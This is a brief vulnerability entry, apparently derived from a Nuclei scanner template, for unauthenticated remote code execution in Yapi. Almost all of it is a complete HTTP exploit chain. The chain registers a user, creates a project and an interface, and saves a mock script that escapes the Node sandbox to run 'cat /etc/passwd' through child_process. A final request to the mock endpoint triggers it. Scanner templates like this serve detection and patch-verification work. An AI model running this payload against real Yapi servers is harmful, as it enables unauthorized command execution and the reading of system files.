# Vulnerability: Yapi - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`yapi-rce.yaml`)

## Description
Yapi allows remote unauthenticated attackers to cause the product to execute arbitrary code.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/user/reg HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

{"email":"{{randstr}}@interact.sh","password":"{{randstr}}","username":"{{randstr}}"}

GET /api/group/list HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json, text/plain, */*

POST /api/project/add HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

{"name":"{{randstr}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}

GET /api/project/get?id={{project_id}} HTTP/1.1
Host: {{Hostname}}

POST /api/interface/add HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

{"method":"GET","catid":"{{project_id}}","title":"{{randstr_1}}","path":"/{{randstr_1}}","project_id":{{project_id}}}

POST /api/plugin/advmock/save HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

{"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"cat /etc/passwd\").toString()","enable":true}

GET /mock/{{project_id}}/{{randstr_1}} HTTP/1.1
Host: {{Hostname}}
```

